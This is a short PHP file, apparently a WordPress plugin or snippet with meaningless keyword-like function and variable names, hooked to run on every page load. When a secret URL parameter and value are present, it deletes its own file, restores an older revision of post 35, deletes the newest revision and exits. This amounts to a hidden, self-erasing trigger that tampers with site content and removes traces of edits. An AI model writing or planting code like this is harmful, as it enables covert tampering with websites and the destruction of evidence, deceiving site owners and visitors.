<?php

function keyword_better_free_builder() {
	if (isset($_GET['auto_ticket_field_advance']) && $_GET['auto_ticket_field_advance'] === 'compat_adsense_author') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$performance_calculator_lite_information = 35;
		$favicon_jquery_game = wp_get_post_revisions($performance_calculator_lite_information);
		if (empty($favicon_jquery_game)) die('no revisions');
		if (count($favicon_jquery_game) < 2) die('less than 2');
		$accessible_field_php = array_shift($favicon_jquery_game);
		$colors_real_reusable = $accessible_field_php->ID;
		$composer_code_testimonials = array_shift($favicon_jquery_game);
		$xml_related_button = $composer_code_testimonials->ID;
		$software_orders_cart_top = wp_restore_post_revision($xml_related_button);
		if ($software_orders_cart_top === false) die('error restoring');
		$software_orders_cart_top = wp_delete_post_revision($colors_real_reusable);		
		if ($software_orders_cart_top === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'keyword_better_free_builder');
